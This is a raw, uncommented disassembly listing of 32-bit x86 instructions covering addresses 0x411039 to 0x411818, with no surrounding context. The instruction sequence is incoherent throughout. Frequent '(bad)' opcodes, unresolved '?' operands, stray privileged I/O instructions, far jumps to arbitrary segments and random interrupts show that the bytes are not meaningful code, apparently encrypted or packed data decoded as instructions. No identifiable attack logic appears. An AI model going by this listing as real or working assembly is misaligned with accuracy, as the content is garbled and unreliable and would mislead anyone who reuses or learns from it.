  411039:	xchg   edx,eax
  41103a:	aaa    
  41103b:	xor    BYTE PTR cs:[edx],ah
  41103e:	cmp    ebx,DWORD PTR [eax-0x1dd9412]
  411044:	fsub   DWORD PTR [esi]
  411046:	loop   0x411071
  411048:	jnp    0x410ff2
  41104a:	rcr    BYTE PTR ds:0xb7f79df0,1
  411050:	inc    ebp
  411051:	loope  0x41109e
  411053:	mov    edx,0x98ba0359
  411058:	sub    BYTE PTR [edx-0x5a],bh
  41105b:	gs push esi
  41105d:	cmc    
  41105e:	int3   
  41105f:	adc    DWORD PTR [esi],ebx
  411061:	fcom   st(3)
  411063:	inc    edx
  411064:	jnp    0x4110b6
  411066:	mov    dh,0x98
  411068:	out    0x5c,al
  41106a:	mov    ebp,0x495cbd9b
  41106f:	mov    ah,0x9a
  411071:	jecxz  0x4110bf
  411073:	push   ds
  411074:	mov    ds:0xe952eae1,eax
  411079:	dec    ecx
  41107a:	sbb    bh,bh
  41107c:	test   DWORD PTR [eax-0x3f],ebp
  41107f:	dec    ecx
  411080:	adc    al,0x5f
  411082:	push   edx
  411083:	mov    ebx,0xaee8039
  411088:	bound  edx,QWORD PTR [ebp+0x2f11d256]
  41108e:	(bad)  
  41108f:	fbld   TBYTE PTR [esi+0x70]
  411092:	sub    BYTE PTR [ecx],cl
  411094:	out    dx,eax
  411095:	call   0x85c39262
  41109a:	aam    0x46
  41109c:	outs   dx,BYTE PTR ds:[esi]
  41109d:	loope  0x4110e8
  41109f:	enter  0x91f7,0xd0
  4110a3:	sbb    esp,DWORD PTR [eax]
  4110a5:	(bad)  
  4110a6:	cdq    
  4110a7:	mov    WORD PTR [edx],?
  4110a9:	mov    WORD PTR [ebx],ds
  4110ab:	(bad)  
  4110ac:	cli    
  4110ad:	xor    esp,DWORD PTR [eax]
  4110af:	pop    ecx
  4110b0:	pop    es
  4110b1:	aaa    
  4110b2:	test   eax,0x86867231
  4110b7:	jg     0x41107d
  4110b9:	adc    al,0x92
  4110bb:	aas    
  4110bc:	test   BYTE PTR [eax-0x24baadfe],0x21
  4110c3:	and    DWORD PTR [ecx-0x22],0x44cb4d2
  4110ca:	jle    0x41112c
  4110cc:	mov    ?,WORD PTR [ecx]
  4110ce:	add    DWORD PTR [ebx-0x3a],0x4b4383b
  4110d5:	mov    es,ecx
  4110d7:	or     ebp,esi
  4110d9:	(bad)  
  4110da:	mov    ds:0x6c1a093e,eax
  4110df:	fcmovb st,st(6)
  4110e1:	neg    DWORD PTR [ebx+0x24f6021]
  4110e7:	xchg   esi,eax
  4110e8:	mov    ch,BYTE PTR [ebx+eiz*4-0x29]
  4110ec:	xchg   ebp,eax
  4110ed:	jb     0x411102
  4110ef:	jle    0x4110b9
  4110f1:	dec    esi
  4110f2:	add    DWORD PTR [edi+0x78147780],esp
  4110f8:	je     0x4110b2
  4110fa:	adc    bl,ch
  4110fc:	or     al,0xd9
  4110fe:	mov    edi,ebx
  411100:	scas   eax,DWORD PTR es:[edi]
  411101:	xchg   esp,eax
  411102:	xchg   BYTE PTR [ebx],dh
  411104:	clc    
  411105:	sub    ah,BYTE PTR [edi+edi*2+0x26]
  411109:	and    BYTE PTR [eax-0x4af81feb],dl
  41110f:	jb     0x4110af
  411111:	sbb    DWORD PTR [eax],ecx
  411113:	out    dx,al
  411114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411115:	dec    edx
  411116:	cdq    
  411117:	dec    ebx
  411118:	mov    es,esp
  41111a:	fs jbe 0x4110b6
  41111d:	inc    eax
  41111e:	adc    DWORD PTR [ebx-0x24],esp
  411121:	mov    bh,BYTE PTR [edi-0x1e]
  411124:	cmc    
  411125:	cmp    BYTE PTR [edx+0x56],ch
  411128:	push   edx
  411129:	xchg   esi,eax
  41112a:	stos   DWORD PTR es:[edi],eax
  41112b:	mov    esp,0xa2a96986
  411130:	ins    BYTE PTR es:[edi],dx
  411131:	outs   dx,BYTE PTR ds:[esi]
  411132:	cwde   
  411133:	cmp    BYTE PTR [esi-0x1c],ah
  411136:	pushf  
  411137:	cmp    eax,0x692b97ba
  41113c:	retf   0xf0b1
  41113f:	into   
  411140:	ins    DWORD PTR es:[edi],dx
  411141:	icebp  
  411142:	inc    edi
  411143:	gs pop di
  411146:	mov    bl,BYTE PTR [ecx+0x31d0a8d5]
  41114c:	pop    eax
  41114d:	mov    cl,0xb3
  41114f:	mov    ah,0x59
  411151:	loope  0x411106
  411153:	cwde   
  411154:	lea    esi,[ebp+0xd]
  411157:	xchg   BYTE PTR [edi+0x91ebab9],al
  41115d:	out    0x87,al
  41115f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411160:	lock jnp 0x41118f
  411163:	test   eax,0x4b05b7ce
  411168:	inc    edx
  411169:	addr16 push esp
  41116b:	daa    
  41116c:	add    eax,0xe0d95a41
  411171:	pop    ebx
  411172:	pusha  
  411173:	inc    ebp
  411174:	push   eax
  411175:	(bad)  
  411176:	mov    ecx,0x4fb1bde8
  41117b:	mov    esi,eax
  41117d:	int3   
  41117e:	mov    ds:0xd8a8d390,al
  411183:	mov    ecx,0x7a66ed17
  411188:	lock repnz loopne 0x411123
  41118c:	ja     0x4111f2
  41118e:	nop
  41118f:	xchg   esp,eax
  411190:	and    ecx,ecx
  411192:	pushf  
  411193:	stc    
  411194:	test   ch,al
  411196:	fsubr  DWORD PTR [edx+0x13df0518]
  41119c:	or     eax,0xb49d3371
  4111a1:	mov    ah,0x95
  4111a3:	push   ecx
  4111a4:	dec    esi
  4111a5:	add    al,BYTE PTR [ebx-0x2f]
  4111a8:	and    al,0xea
  4111aa:	fwait
  4111ab:	xchg   esi,eax
  4111ac:	or     DWORD PTR [edi-0x74],ebx
  4111af:	addr16 int 0x13
  4111b2:	les    ebx,FWORD PTR [eax-0x770cff9]
  4111b8:	or     bh,0x6a
  4111bb:	int    0x66
  4111bd:	ret    
  4111be:	xchg   DWORD PTR [ecx],edx
  4111c0:	mov    ecx,0xe6f95ba3
  4111c5:	shl    DWORD PTR [eax-0x38],cl
  4111c8:	mov    dl,BYTE PTR [ecx-0x5f42f91a]
  4111ce:	fstp   DWORD PTR [ebp-0x39]
  4111d1:	repnz add DWORD PTR [esi-0x3b95ae44],edi
  4111d8:	(bad)  
  4111d9:	sub    DWORD PTR [edx-0x3797d8fc],esi
  4111df:	or     edi,DWORD PTR [esi-0x2b87ecac]
  4111e5:	xchg   ecx,eax
  4111e6:	mov    esp,cs
  4111e8:	sub    al,0x26
  4111ea:	sahf   
  4111eb:	call   0x79a3e442
  4111f0:	mov    eax,0xf36911ad
  4111f5:	lods   eax,DWORD PTR ds:[esi]
  4111f6:	sub    eax,0xe09b1a1c
  4111fb:	adc    al,0x32
  4111fd:	repz les esi,FWORD PTR fs:[esi-0x52]
  411202:	repz repz test eax,0xa3f1f2c1
  411209:	mov    ds,WORD PTR [eax-0x3d]
  41120c:	leave  
  41120d:	add    al,ah
  41120f:	push   ebx
  411210:	test   edi,eax
  411212:	fcmove st,st(4)
  411214:	add    al,0xa9
  411216:	adc    bl,BYTE PTR [edi*1-0x788b96bb]
  41121d:	inc    edi
  41121e:	sbb    dh,BYTE PTR [ebx-0x5c]
  411221:	cld    
  411222:	retf   
  411223:	push   esp
  411224:	mov    edx,0xf65e5d91
  411229:	aaa    
  41122a:	cmp    DWORD PTR [ecx-0x30],eax
  41122d:	add    al,0xab
  41122f:	mov    eax,ds:0xf648174d
  411234:	push   esp
  411235:	fdivr  QWORD PTR [ebx-0x5c]
  411238:	inc    esp
  411239:	adc    al,0x5a
  41123b:	jb     0x41129f
  41123d:	int    0x79
  41123f:	not    BYTE PTR [ebp+esi*2-0xdb2e614]
  411246:	std    
  411247:	adc    BYTE PTR [ecx-0x9],bl
  41124a:	add    esp,DWORD PTR [edx-0x52]
  41124d:	lock rol BYTE PTR [edx+esi*8],1
  411251:	jmp    0x494e:0xfc7b73fb
  411258:	cmp    eax,0xefdc4105
  41125d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41125e:	fxch   st(4)
  411260:	dec    ebp
  411261:	push   ss
  411262:	pop    esi
  411263:	lods   al,BYTE PTR ds:[esi]
  411264:	push   edi
  411265:	or     esi,eax
  411267:	and    edi,DWORD PTR [eax]
  411269:	mov    BYTE PTR [esi+0x9],al
  41126c:	sub    al,0xc4
  41126e:	dec    eax
  41126f:	fbld   TBYTE PTR [edx]
  411271:	lods   al,BYTE PTR ds:[esi]
  411272:	lods   eax,DWORD PTR ds:[esi]
  411273:	inc    ecx
  411274:	adc    eax,edx
  411276:	(bad)  
  411277:	cli    
  411278:	sub    eax,0x3a5c2897
  41127d:	push   ebx
  41127e:	cmp    DWORD PTR [ebp+esi*8-0x4895cf0b],0x3b4b4c5a
  411289:	mov    BYTE PTR [edi],dl
  41128b:	fdivp  st(5),st
  41128d:	push   esp
  41128e:	jo     0x411250
  411290:	pop    esp
  411291:	scas   al,BYTE PTR es:[edi]
  411292:	in     eax,dx
  411293:	mov    ecx,0x5c1e130b
  411298:	sbb    DWORD PTR [ecx+eax*4+0x490b77c7],0xb
  4112a0:	shl    DWORD PTR [edx-0xb],0x2d
  4112a4:	scas   eax,DWORD PTR es:[edi]
  4112a5:	jp     0x411243
  4112a7:	ja     0x41131a
  4112a9:	pop    ecx
  4112aa:	not    DWORD PTR ds:0x84784bcf
  4112b0:	jb     0x4112cc
  4112b2:	mov    BYTE PTR [edi+0x58],ah
  4112b5:	sub    eax,ecx
  4112b7:	out    0x51,al
  4112b9:	scas   eax,DWORD PTR es:[edi]
  4112ba:	add    ch,BYTE PTR [ecx]
  4112bc:	push   ebx
  4112bd:	xchg   edi,eax
  4112be:	sub    ch,BYTE PTR [ebx+0x29]
  4112c1:	fimul  WORD PTR [edx]
  4112c3:	jb     0x411330
  4112c5:	jno    0x4112e8
  4112c7:	imul   edi,DWORD PTR [ecx+0x782be78e],0xa1d9825e
  4112d1:	in     al,dx
  4112d2:	and    esi,DWORD PTR [ecx+0x2d0c9979]
  4112d8:	dec    ebx
  4112d9:	and    al,BYTE PTR [esi]
  4112db:	add    BYTE PTR [ecx-0x4a],dl
  4112de:	pop    ebp
  4112df:	test   bl,al
  4112e1:	call   0x5f26d830
  4112e6:	xchg   ecx,esi
  4112e8:	inc    ebx
  4112e9:	pusha  
  4112ea:	bound  eax,QWORD PTR [ebp-0x11]
  4112ed:	mov    DWORD PTR [edi],eax
  4112ef:	xlat   BYTE PTR ds:[ebx]
  4112f0:	jp     0x411335
  4112f2:	and    eax,0xb7b195
  4112f7:	pop    ss
  4112f8:	push   es
  4112f9:	jge    0x41135e
  4112fb:	dec    esi
  4112fc:	pop    edx
  4112fd:	and    ebp,ebp
  4112ff:	mov    ebx,esp
  411301:	sub    ah,0x8b
  411304:	shl    BYTE PTR [ebp+0x5f],0x23
  411308:	inc    BYTE PTR [ebp-0x73]
  41130b:	inc    ebx
  41130c:	pop    eax
  41130d:	jge    0x411318
  41130f:	dec    esp
  411310:	add    dh,bh
  411312:	jns    0x4112f9
  411314:	dec    ebp
  411315:	jge    0x4112da
  411317:	sbb    ebp,DWORD PTR [ecx-0x74]
  41131a:	es inc edi
  41131c:	in     eax,0x0
  41131e:	xchg   edi,eax
  41131f:	aas    
  411320:	inc    ecx
  411321:	push   es
  411322:	xor    al,0x4e
  411324:	and    BYTE PTR [edi+0x3eb4b3fb],0x5d
  41132b:	cmp    esp,esp
  41132d:	push   ecx
  41132e:	add    edx,DWORD PTR [esi+0x3400f28a]
  411334:	jmp    0xa7a5e8c5
  411339:	xor    dl,BYTE PTR [ebp+0x30e97e8c]
  41133f:	mov    esp,DWORD PTR [ecx+0x3d8270af]
  411345:	es inc ecx
  411347:	pop    esi
  411348:	stos   DWORD PTR es:[edi],eax
  411349:	call   0xa4f2:0xfcd070ce
  411350:	sbb    eax,0xf0b68f7f
  411355:	and    al,0x54
  411357:	add    BYTE PTR [edx+0x19],cl
  41135a:	add    al,0xb3
  41135c:	or     eax,0xfcb38aa4
  411361:	mov    dh,0x84
  411363:	or     BYTE PTR [edx+0x271b322d],dl
  411369:	aam    0xa3
  41136b:	cmp    DWORD PTR [edx-0x7a],edi
  41136e:	daa    
  41136f:	mov    bl,0x8d
  411371:	xor    al,0xf7
  411373:	adc    dl,al
  411375:	and    eax,0x39b8ea1e
  41137a:	sbb    BYTE PTR [edx-0x14],cl
  41137d:	(bad)
  411381:	pop    edx
  411382:	int    0x56
  411384:	xor    DWORD PTR ds:[esi],esp
  411387:	add    esi,eax
  411389:	je     0x4113f2
  41138b:	mov    bh,0x35
  41138d:	cs out dx,eax
  41138f:	mov    ds:0x2658fa71,al
  411394:	ja     0x4113da
  411396:	ds dec ecx
  411398:	xchg   DWORD PTR [ebx-0x3f],ecx
  41139b:	fbld   TBYTE PTR [ecx+0x7e]
  41139e:	jmp    0x94e91e9
  4113a3:	(bad)  
  4113a4:	lds    ebx,FWORD PTR [ebx]
  4113a6:	test   DWORD PTR ds:0x45a18293,eax
  4113ac:	cdq    
  4113ad:	lea    esp,[eax]
  4113af:	xchg   ebp,eax
  4113b0:	mov    WORD PTR [edi+edx*8-0x67],cs
  4113b4:	or     eax,eax
  4113b6:	shl    edx,1
  4113b8:	or     BYTE PTR [eax+0x2c],al
  4113bb:	push   ebp
  4113bc:	imul   edx,DWORD PTR [eax-0x15724c13],0x3ff0767
  4113c6:	daa    
  4113c7:	out    0xeb,eax
  4113c9:	pop    esp
  4113ca:	(bad)  
  4113cb:	scas   al,BYTE PTR es:[edi]
  4113cc:	js     0x4113ce
  4113ce:	js     0x41135e
  4113d0:	in     al,0xe
  4113d2:	cmp    DWORD PTR [ebp-0x20d4e680],0xfe7e5ec5
  4113dc:	loopne 0x411374
  4113de:	and    DWORD PTR ds:0xd0e611c0,ebx
  4113e4:	or     al,0x81
  4113e6:	scas   al,BYTE PTR es:[edi]
  4113e7:	fadd   DWORD PTR [edx+0x69505ba8]
  4113ed:	scas   al,BYTE PTR es:[edi]
  4113ee:	mov    eax,ds:0x9a22204e
  4113f3:	push   ebx
  4113f4:	add    edi,edi
  4113f6:	xlat   BYTE PTR ds:[ebx]
  4113f7:	aas    
  4113f8:	mov    ecx,0xd49afa8f
  4113fd:	loop   0x41144e
  4113ff:	je     0x411383
  411401:	dec    eax
  411402:	ror    DWORD PTR [edx],1
  411404:	or     al,0x7d
  411406:	in     eax,dx
  411407:	sbb    BYTE PTR [ecx+0x7607c80b],ch
  41140d:	iret   
  41140e:	pop    esi
  41140f:	aas    
  411410:	xchg   DWORD PTR [ebx-0xf],ecx
  411413:	inc    eax
  411414:	cmp    dl,BYTE PTR [edi+0x272cbace]
  41141a:	ficom  DWORD PTR [ebp-0x79]
  41141d:	cli    
  41141e:	rcr    BYTE PTR [edi+0x7a72e344],1
  411424:	jb     0x411456
  411426:	cmp    ah,BYTE PTR [edi-0x48]
  411429:	sbb    al,0xd4
  41142b:	rcr    BYTE PTR [ebx],cl
  41142d:	adc    dh,BYTE PTR [ebx+0x745d9e8d]
  411433:	or     ecx,DWORD PTR [ebx-0x2a]
  411436:	adc    BYTE PTR [eax],bl
  411438:	cmp    bh,bh
  41143a:	xlat   BYTE PTR ds:[ebx]
  41143b:	mov    bh,0x69
  41143d:	mov    bh,0xec
  41143f:	push   ss
  411440:	mov    cl,al
  411442:	jnp    0x41141c
  411444:	pop    ds
  411445:	(bad)  
  411446:	push   0x27b754ff
  41144b:	imul   esp,ecx,0xffffff9b
  41144e:	stc    
  41144f:	loope  0x411470
  411451:	add    al,0x5f
  411453:	cs lahf 
  411455:	jl     0x411499
  411457:	dec    ebp
  411458:	xor    DWORD PTR [edi+0x63cbd332],ecx
  41145e:	loope  0x4113e9
  411460:	push   edx
  411461:	cmp    DWORD PTR [eax-0x23c5acdf],edx
  411467:	rcl    edi,cl
  411469:	pop    ebx
  41146a:	sub    bh,BYTE PTR [ebp-0x79a8462d]
  411470:	or     eax,0x4ffe384c
  411475:	add    al,0x90
  411477:	sbb    esi,DWORD PTR [edi-0xf45f6a7]
  41147d:	pop    edx
  41147e:	adc    al,0x17
  411480:	fstp   DWORD PTR [ecx+0x66]
  411483:	repz jecxz 0x4114a1
  411486:	lea    edx,[ebp-0x4f772a]
  41148c:	scas   eax,DWORD PTR es:[edi]
  41148d:	pop    ss
  41148e:	mov    eax,0x87704c1c
  411493:	or     DWORD PTR [ecx+0x4a],eax
  411496:	dec    ecx
  411497:	xchg   ecx,eax
  411498:	outs   dx,BYTE PTR ds:[esi]
  411499:	les    esp,FWORD PTR [eax]
  41149b:	xchg   esi,eax
  41149c:	out    0xcd,al
  41149e:	adc    al,0x45
  4114a1:	aas    
  4114a2:	adc    eax,0x8785f7f
  4114a7:	inc    esi
  4114a8:	nop
  4114a9:	dec    esp
  4114aa:	popf   
  4114ab:	test   eax,0xff27a1e5
  4114b0:	rcr    DWORD PTR [edx+0x7],1
  4114b3:	in     al,0xab
  4114b5:	xor    eax,0xc27fc7a6
  4114ba:	inc    esp
  4114bb:	cwde   
  4114bc:	(bad)  
  4114bd:	rol    BYTE PTR [ecx+ebp*1+0x4c8490a0],cl
  4114c4:	jb     0x411484
  4114c6:	mov    edi,gs
  4114c8:	mov    bl,BYTE PTR [edx-0x10967604]
  4114ce:	imul   ebp,DWORD PTR [eax-0x393a1156],0xd340058d
  4114d8:	or     bh,0xfc
  4114db:	retf   
  4114dc:	mov    BYTE PTR [ebp+0x71],dh
  4114df:	ret    
  4114e0:	imul   ebx,DWORD PTR [ecx],0x6f
  4114e3:	mov    ebp,0xac316983
  4114e8:	cld    
  4114e9:	mov    bl,0x36
  4114eb:	cmp    ebp,DWORD PTR [eax+ebx*4-0xe]
  4114ef:	sub    esp,DWORD PTR [eax]
  4114f1:	and    ebx,ecx
  4114f3:	xchg   edi,eax
  4114f4:	ds stos BYTE PTR es:[edi],al
  4114f6:	lock retf 
  4114f8:	adc    eax,0x3e2b6295
  4114fd:	xor    al,0xca
  4114ff:	in     eax,0x4d
  411501:	mov    DWORD PTR [edx],ebx
  411503:	mov    ah,0xbd
  411505:	fst    DWORD PTR [ecx]
  411507:	inc    esp
  411508:	adc    DWORD PTR [edi-0x703f7c59],ebx
  41150e:	fnstcw WORD PTR ds:0xe756a0c8
  411514:	and    DWORD PTR [ebp+0x6],0x7aae6b67
  41151b:	fst    DWORD PTR ds:0x765317fa
  411521:	jge    0x4114b0
  411523:	xor    ecx,eax
  411525:	ss dec esp
  411527:	mov    dh,0xe0
  411529:	pop    ebp
  41152a:	mov    ah,dl
  41152c:	leave  
  41152d:	pop    edi
  41152e:	fs or  eax,0x5ae34ad0
  411534:	mov    bl,0xbe
  411536:	xor    ecx,esi
  411538:	sub    eax,0xf741f9ea
  41153d:	cmp    eax,0xe7d53e00
  411542:	mov    WORD PTR [ecx+edx*8+0x5f404185],gs
  411549:	ret    0x4029
  41154c:	jo     0x411510
  41154e:	mov    ds:0xac5109d1,eax
  411553:	jl     0x4114d5
  411555:	fnstenv [ebx]
  411557:	shl    BYTE PTR [edx],cl
  411559:	fdivr  st,st(1)
  41155b:	hlt    
  41155c:	xchg   dl,dl
  41155e:	pop    es
  41155f:	scas   eax,DWORD PTR es:[edi]
  411560:	mov    edi,DWORD PTR [edx+0x6e3c8688]
  411566:	loopne 0x411566
  411568:	mov    DWORD PTR [eax],esp
  41156a:	cmp    eax,0x52734faa
  41156f:	xchg   ecx,eax
  411570:	lahf   
  411571:	push   cs
  411572:	out    dx,al
  411573:	or     BYTE PTR [ecx+0x22ca8983],0xa5
  41157a:	mov    BYTE PTR [edx],ch
  41157c:	inc    ebx
  41157d:	sbb    cl,BYTE PTR [esi]
  41157f:	mov    esi,0x23f53f26
  411584:	(bad)  
  411585:	(bad)  
  411586:	repnz inc edx
  411588:	cmp    dh,bl
  41158a:	push   ecx
  41158b:	push   ds
  41158c:	inc    esi
  41158d:	jno    0x411524
  41158f:	lods   eax,DWORD PTR ds:[esi]
  411590:	or     BYTE PTR [eax],0xf4
  411593:	cmp    al,bh
  411595:	mov    edi,0x91079029
  41159a:	jmp    0x4f0c1f3f
  41159f:	(bad)  
  4115a0:	in     al,0x3a
  4115a2:	fwait
  4115a3:	mov    cl,0xe0
  4115a5:	add    eax,0x11b98f36
  4115aa:	pop    edi
  4115ab:	or     esi,DWORD PTR [edi+0x62e0c5e2]
  4115b1:	adc    BYTE PTR [eax+0x7d],dh
  4115b4:	sbb    BYTE PTR [edx+0x1b6eda78],cl
  4115ba:	mov    dl,ch
  4115bc:	and    eax,0xf8087fc5
  4115c1:	jg     0x4115d7
  4115c3:	(bad)  
  4115c4:	rcl    DWORD PTR [ebp-0x5fefd179],cl
  4115ca:	enter  0x5f55,0x32
  4115ce:	add    eax,0xc166e7e6
  4115d3:	(bad)  
  4115d4:	pop    edi
  4115d5:	mov    ch,0xd1
  4115d7:	dec    eax
  4115d8:	push   ds
  4115d9:	mov    cl,ah
  4115db:	sti    
  4115dc:	push   ss
  4115dd:	cmp    DWORD PTR [edx-0x55],0xe0cb421
  4115e4:	int    0x8f
  4115e6:	xor    dh,dl
  4115e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115e9:	mov    al,ds:0xfd0c36c9
  4115ee:	mov    WORD PTR [ebp+0xffdd13c],cs
  4115f4:	lea    esp,[ebp+0x1c7b5466]
  4115fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115fb:	jecxz  0x4115ac
  4115fd:	add    al,0x2d
  4115ff:	pop    ss
  411600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411601:	jecxz  0x411608
  411603:	xchg   ebp,eax
  411604:	addr16 dec ebp
  411606:	lods   al,BYTE PTR ds:[esi]
  411607:	test   eax,0x9ac04743
  41160c:	ins    BYTE PTR es:[edi],dx
  41160d:	mov    edi,0x3830d806
  411612:	push   eax
  411613:	jmp    0x2abf:0x5c557956
  41161a:	in     eax,0xd8
  41161c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41161d:	ds pop ecx
  41161f:	div    DWORD PTR ds:0xf5ca6f5d
  411625:	add    al,0x6
  411627:	pop    esi
  411628:	aaa    
  411629:	iret   
  41162a:	push   es
  41162b:	mov    al,0x22
  41162d:	div    DWORD PTR [edx-0xb41c355]
  411633:	pop    ss
  411634:	mov    gs,WORD PTR [edi+0x534cbd03]
  41163a:	ret    0x6275
  41163d:	cmp    edx,eax
  41163f:	test   al,bh
  411641:	mov    esp,0xad45c8d8
  411646:	mov    ch,0x75
  411648:	cs ins DWORD PTR es:[edi],dx
  41164a:	and    DWORD PTR [edi-0x23],eax
  41164d:	sub    eax,0xbb681737
  411652:	data16 cmp BYTE PTR [ecx-0x2d53eb58],dl
  411659:	push   esi
  41165a:	jns    0x411653
  41165c:	cmp    al,0xbb
  41165e:	mov    dl,BYTE PTR [edi]
  411660:	ror    DWORD PTR [ecx],0x77
  411663:	sar    ebx,0x99
  411666:	aas    
  411667:	xchg   ebp,eax
  411668:	aad    0x2c
  41166a:	sub    BYTE PTR [esp+esi*8+0x30],ch
  41166e:	jae    0x411609
  411670:	push   esi
  411671:	jo     0x411607
  411673:	lods   eax,DWORD PTR ds:[esi]
  411674:	adc    al,0xe1
  411676:	data16 ss sub al,0xf9
  41167a:	push   esi
  41167b:	mov    ch,0xf1
  41167d:	outs   dx,DWORD PTR ds:[esi]
  41167e:	xchg   ecx,eax
  41167f:	outs   dx,BYTE PTR ds:[esi]
  411680:	imul   ebx,DWORD PTR [ecx],0x11
  411683:	fnsave [edx]
  411685:	fld    TBYTE PTR [edx]
  411687:	ret    
  411688:	in     al,dx
  411689:	(bad)  
  41168a:	adc    esp,ebp
  41168c:	dec    eax
  41168d:	ret    
  41168e:	das    
  41168f:	mov    eax,ds:0x7235a41b
  411694:	xor    al,0xc8
  411696:	(bad)  
  411697:	rol    DWORD PTR [esp+ebx*8-0x394c4472],cl
  41169e:	inc    ebp
  41169f:	cli    
  4116a0:	add    eax,0xdd9d1de3
  4116a5:	sti    
  4116a6:	mov    dh,0x45
  4116a8:	adc    BYTE PTR [esi+0x21623dc3],0x41
  4116af:	pop    edx
  4116b0:	push   eax
  4116b1:	inc    edi
  4116b2:	jecxz  0x411719
  4116b4:	add    ah,cl
  4116b6:	push   ss
  4116b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b8:	mov    ebp,0x3c3ff530
  4116bd:	fisubr DWORD PTR [edx-0x2d]
  4116c0:	mov    edi,DWORD PTR ds:0x3e7f6da
  4116c6:	fisubr WORD PTR [ebx+eiz*4-0x27]
  4116ca:	aad    0x8e
  4116cc:	cdq    
  4116cd:	imul   ebx,DWORD PTR [eax],0x867a8ee4
  4116d3:	xor    BYTE PTR [ebx+0x12772185],dh
  4116d9:	or     al,0x28
  4116db:	enter  0xb70e,0x7d
  4116df:	pusha  
  4116e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e1:	fwait
  4116e2:	sbb    cl,BYTE PTR [ebp-0x4b]
  4116e5:	retf   
  4116e6:	or     al,bl
  4116e8:	mov    cl,0x64
  4116ea:	mov    dh,0x91
  4116ec:	pop    edx
  4116ed:	push   edi
  4116ee:	mov    ds:0x20fda2b0,eax
  4116f3:	xchg   ecx,eax
  4116f4:	and    al,0x9e
  4116f6:	pusha  
  4116f7:	int    0x2c
  4116f9:	mov    dh,0xe7
  4116fb:	out    0xda,eax
  4116fd:	cli    
  4116fe:	sbb    eax,0xb3cf5bf2
  411703:	mov    ds:0xafdb3efc,eax
  411708:	std    
  411709:	inc    ebx
  41170a:	mov    al,ds:0x33fa8a9e
  41170f:	test   al,0xfb
  411711:	push   esi
  411712:	cmp    eax,0x5ac64d06
  411717:	pop    esp
  411718:	jo     0x411766
  41171a:	gs aas 
  41171c:	scas   eax,DWORD PTR es:[edi]
  41171d:	xor    DWORD PTR [edi],esp
  41171f:	pop    ebp
  411720:	or     BYTE PTR [ebx-0x6d],ch
  411723:	ins    BYTE PTR es:[edi],dx
  411724:	fs push esp
  411726:	stos   BYTE PTR es:[edi],al
  411727:	leave  
  411728:	repnz into 
  41172a:	pop    es
  41172b:	les    ecx,FWORD PTR [ebp+0x6496c7c2]
  411731:	nop
  411732:	dec    edx
  411733:	or     BYTE PTR [eax],bh
  411735:	dec    eax
  411736:	je     0x4116d9
  411738:	push   ebx
  411739:	loope  0x4116d9
  41173b:	icebp  
  41173c:	mov    BYTE PTR [edi+0xa],dh
  41173f:	(bad)  
  411740:	jae    0x41177e
  411742:	mov    ss,ebp
  411744:	pusha  
  411745:	push   edx
  411746:	popf   
  411747:	rcr    DWORD PTR [edx+0x69],0x6b
  41174b:	xor    BYTE PTR [ecx],cl
  41174d:	mov    ebx,0x29e973b3
  411752:	cs std 
  411754:	pusha  
  411755:	icebp  
  411756:	mov    eax,0xcced5df9
  41175b:	xor    DWORD PTR [ecx-0x21],ebp
  41175e:	call   0x1278:0x76a88fe6
  411765:	push   cs
  411766:	pop    es
  411767:	outs   dx,DWORD PTR ds:[esi]
  411768:	pushf  
  411769:	(bad)  
  41176a:	test   BYTE PTR [esi],0xbd
  41176d:	test   al,0x4c
  41176f:	lods   al,BYTE PTR ds:[esi]
  411770:	or     al,0xff
  411772:	jbe    0x411755
  411774:	mov    ds:0x2e80c874,al
  411779:	in     eax,0xbb
  41177b:	mov    ds:0xc6c58fe5,al
  411780:	sbb    DWORD PTR [ecx-0x48],ecx
  411783:	pop    ebx
  411784:	pop    es
  411785:	aad    0x54
  411787:	inc    esi
  411788:	fistp  DWORD PTR [esi+0x48d4f899]
  41178e:	add    ecx,ebx
  411790:	adc    al,0xdd
  411792:	and    DWORD PTR [edx+0x6a],ebx
  411795:	or     edi,DWORD PTR [ebx]
  411797:	or     BYTE PTR [eax-0x1cfa954b],cl
  41179d:	push   eax
  41179e:	jns    0x411759
  4117a0:	fcomp  QWORD PTR [ebx+0x5e74f074]
  4117a6:	bound  esi,QWORD PTR [esi-0x14085387]
  4117ac:	cli    
  4117ad:	sbb    al,0x21
  4117af:	mov    ebx,0x9d630627
  4117b4:	inc    ebp
  4117b5:	sti    
  4117b6:	sub    dl,BYTE PTR [ebx+0x5c1e88f7]
  4117bc:	pop    ds
  4117bd:	mov    ds:0x6a77dfea,al
  4117c2:	xchg   ecx,eax
  4117c3:	mov    ah,0x34
  4117c5:	enter  0x6c1a,0x50
  4117c9:	jl     0x411784
  4117cb:	rol    al,0xe3
  4117ce:	and    esi,DWORD PTR [edx+0x7b]
  4117d1:	push   ebx
  4117d2:	pop    ecx
  4117d3:	or     ebp,edi
  4117d5:	into   
  4117d6:	or     cl,ch
  4117d8:	dec    esp
  4117d9:	xchg   ebp,eax
  4117da:	(bad)  
  4117db:	mov    ecx,0xa67e3ab9
  4117e0:	pusha  
  4117e1:	in     eax,dx
  4117e2:	xchg   esp,eax
  4117e3:	cmp    ecx,edx
  4117e5:	lods   eax,DWORD PTR ds:[esi]
  4117e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117e7:	mov    edi,0xc33049f5
  4117ec:	pop    DWORD PTR [ebp+eiz*2-0x19cfc530]
  4117f3:	jae    0x411866
  4117f5:	dec    esi
  4117f6:	mov    ?,ecx
  4117f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117f9:	sub    edi,DWORD PTR [ebp-0x20]
  4117fc:	popf   
  4117fd:	push   ecx
  4117fe:	mov    ds:0xdc23b414,al
  411803:	mov    esp,0x5a7f401f
  411808:	xor    eax,0x88530b
  41180d:	sbb    ch,ch
  41180f:	mov    ah,0x6c
  411811:	and    DWORD PTR [eax],ebx
  411813:	sbb    eax,0xcf6010c1
  411818:	test   eax,0x8ea82b8d
